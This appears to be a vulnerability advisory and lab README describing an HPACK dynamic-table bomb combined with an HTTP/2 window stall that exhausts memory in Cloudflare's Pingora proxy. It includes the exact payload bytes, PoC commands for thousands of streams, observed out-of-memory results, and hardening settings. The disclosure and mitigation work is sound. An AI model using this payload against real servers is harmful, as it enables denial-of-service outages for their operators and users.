# Pingora HTTP/2 HPACK Bomb + Window Stall Memory Exhaustion

| | |
|---|---|
| **Component** | `cloudflare/pingora` HTTP/2 server path |
| **Vulnerable files** | `pingora-core/src/protocols/http/v2/server.rs`, Rust crate `h2` 0.4.x |
| **Vulnerable configuration** | Pingora service with HTTP/2 enabled and default `H2Options` |
| **Trigger path** | Remote HTTP/2 client sends the original `hpack_poc` dynamic-table bomb: `("a", "")` inserted once, then many one-byte `0xbe` indexed references, across many concurrent streams |
| **Lab target** | Self-contained Docker lab using published `pingora = 0.8.0` |

## Vulnerability Overview

This is the original `hpack_poc` implemented for Pingora.

The attacker creates one HPACK dynamic-table entry with the header name `a` and an empty value. After insertion, the newest dynamic entry is index 62, so each byte `0xbe` decodes to another `a:` header. One wire byte therefore creates one decoded header object.

Rust `h2` accounts each decoded field as:

```text
name.len + value.len + 32
```

For `a:`, that is `1 + 0 + 32 = 33` decoded header-list bytes per one wire byte. Pingora leaves `h2`'s default decoded header-list limit at 16 MiB per stream and does not set a default inbound stream-count cap. A client can therefore open many streams on one HTTP/2 connection, send a compact HPACK block on each stream, and use `SETTINGS_INITIAL_WINDOW_SIZE=0` plus slow `WINDOW_UPDATE` drips to keep the inflated request state resident.

This is a memory-exhaustion denial of service. It is not H2O's Cookie-specific stack `alloca` bug and it is not memory corruption.

## Vulnerability Details

### Pingora exposes raw `h2::server::Builder` defaults

`pingora-core/src/protocols/http/v2/server.rs`:

```rust
pub use h2::server::Builder as H2Options;

pub async fn handshake(io: Stream, options: Option<H2Options>) -> Result<H2Connection<Stream>> {
    let options = options.unwrap_or_default();
    let res = options.handshake(io).await;
```

If the application does not set `app.h2_options`, Pingora uses `H2Options::default()`.

### `h2` permits a 16 MiB decoded header list per stream

`h2-0.4.14/src/codec/framed_read.rs`:

```rust
const DEFAULT_SETTINGS_MAX_HEADER_LIST_SIZE: usize = 16 << 20;
```

`h2-0.4.14/src/frame/headers.rs`:

```rust
headers_size += decoded_header_size(name.as_str().len(), value.len());
if headers_size < max_header_list_size {
    self.fields.append(name, value);
}

fn decoded_header_size(name: usize, value: usize) -> usize {
    name + value + 32
}
```

For the hpack_poc dynamic `a:` header:

```text
wire byte:              0xbe
decoded header:         a:
h2 accounting:          1 + 0 + 32 = 33 bytes
default payload here:   32,000 headers per stream
decoded h2 accounting:  1,056,000 bytes per stream
```

### Default receive-side stream count is effectively unbounded

`h2-0.4.14/src/proto/streams/counts.rs`:

```rust
max_recv_streams: config.remote_max_initiated.unwrap_or(usize::MAX),
```

If Pingora does not call `H2Options::max_concurrent_streams()`, the practical stream limit is memory.

### The window stall keeps the request state alive

The lab response body is only `ok\n`, but the client advertises:

```text
SETTINGS_INITIAL_WINDOW_SIZE = 0
```

Pingora can accept the request and generate the response, but HTTP/2 flow control prevents body DATA from being sent until the client sends `WINDOW_UPDATE`. Pingora's H2 session starts with `write_timeout: None`, so a slow client can keep response writes pending while the decoded request headers remain owned by the stream/session.

## Proof of Concept

### Layout

```text
UNPATCHED_pingora_hpack_bomb/
├── README.md
├── docker-compose.yml
├── run.sh
├── pingora-lab/
│   ├── Dockerfile
│   ├── Cargo.toml
│   ├── Cargo.lock
│   └── src/main.rs
└── attacker/
    ├── hpack_bomb.py
    └── monitor_rss.py
```

The Dockerfile and Docker Compose file are self-contained: their build context is this directory, and they do not copy or reference files outside it.

### Components

- `pingora-lab/` - minimal Pingora h2c server. It enables HTTP/2 cleartext on port 6145 and returns a normal tiny `ok\n` body. It has no artificial server-side hold; only the hardening env vars are optional.
- `attacker/hpack_bomb.py` - nginx `hpack_poc` style raw HTTP/2 client adapted to Pingora/h2c.
- `attacker/monitor_rss.py` - process RSS monitor for the Pingora container.
- `run.sh` - convenience wrapper for build/start/attack/monitor/mitigation runs.

### Running the PoC

```bash
cd UNPATCHED_pingora_hpack_bomb

# terminal 1 - vulnerable Pingora lab, 6 GiB cap
./run.sh start

# terminal 2 - watch RSS
./run.sh monitor

# terminal 3 - original hpack_poc shape
./run.sh attack128
```

Equivalent direct invocation:

```bash
python3 attacker/hpack_bomb.py \
  --host 127.0.0.1 \
  --port 6145 \
  --connections 1 \
  --streams 128 \
  --headers 32000 \
  --hold 120
```

The PoC sends:

```python
block = bytearray()
block += b"\x82\x84\x86"             # :method GET, :path /, :scheme http
block += b"\x41\x01x"                # :authority: x, indexed
block += b"\x40\x01a\x00"            # dynamic entry: a: ""
block += b"\xbe" * (headers - 5)     # indexed references to a: ""
```

Expected PoC banner:

```text
======================================================================
  Pingora HPACK Bomb + Window Stall PoC
  Target:      h2c://127.0.0.1:6145
  Connections: 1
  Streams:     128 per connection
  Headers:     32,000 per stream
  Hold:        120s (drip every 50s)
======================================================================

  Estimated Pingora memory:
    h2 decoded header-list: 1.0 MiB per stream
    observed RSS model:     1.9 MiB per stream
    total RSS estimate:     243 MiB (0.2 GiB)
    Wire upload:            3.9 MiB
```

### OOM demonstration

```bash
./run.sh oom2g
```

This starts a fresh 2 GiB container and sends 2,048 hpack_poc streams:

```text
--streams 2048 --headers 32000 --hold 5
```

Observed result:

```text
Streams:     2048 per connection
Headers:     32,000 per stream
total RSS estimate:     3891 MiB (3.8 GiB)
Wire upload:            62.5 MiB
Connection 0: SEND FAILED - [Errno 32] Broken pipe
state=exited oom=true exit=137
```

### Large RSS demonstration

```bash
./run.sh start
./run.sh attack2048
```

This uses one HTTP/2 connection with 2,048 streams and the original 32,000-header hpack_poc block. Based on the 64-stream/120 MiB OOM result, this is the comparable multi-GiB Pingora run for the dynamic-table PoC:

```text
2048 streams * ~1.9 MiB/stream ~= 3.8 GiB RSS
wire upload ~= 62.5 MiB
```

### Hardened comparison

```bash
./run.sh mitigated
```

This starts a container with:

```text
PINGORA_H2_MAX_HEADER_LIST_SIZE=65536
PINGORA_H2_MAX_CONCURRENT_STREAMS=32
```

The same 64-stream, 32,000-header payload is rejected before it can park large decoded request state.

## Exploitability

Exploitation requires:

1. Pingora HTTP/2 enabled (`enable_h2()` on TLS or h2c in a cleartext deployment).
2. Default or overly permissive `H2Options`.
3. Enough process/container memory for the attacker to park many streams.

In default Pingora H2 settings, this is easier to exploit than current nginx with the downloaded `~/Downloads/poc_hpack` payload. Current nginx rejected the 32,000-header request with `client sent too many header lines`, while Pingora accepts the hpack_poc shape because it lacks an equivalent default decoded header-count cap and has no default inbound stream cap.

## Countermeasures

Set conservative HTTP/2 options whenever enabling HTTP/2:

```rust
let mut h2 = H2Options::new();
h2.max_header_list_size(64 * 1024);
h2.max_concurrent_streams(32);
app.h2_options = Some(h2);
```

Also set a finite downstream write timeout for H2 sessions:

```rust
session.set_write_timeout(Some(std::time::Duration::from_secs(10)));
```

For a class-wide fix, Pingora should ship safer defaults or templates:

- decoded header-list size: 64 KiB to 128 KiB
- inbound concurrent streams: 32 to 100
- downstream write timeout: finite default
- decoded header-count cap, because byte-size caps alone can still allow many tiny fields when the cap is large

## Notes

- Bare h1-only Pingora listeners are not reachable through HPACK.
- This lab uses h2c for reproducibility; production TLS listeners hit the same path when ALPN `h2` is enabled.
- The dynamic `a:` hpack_poc is different from the HPACK Cookie bomb. The Cookie bomb uses static index 32 (`0xa0`); this PoC inserts `a:` dynamically and repeats index 62 (`0xbe`).
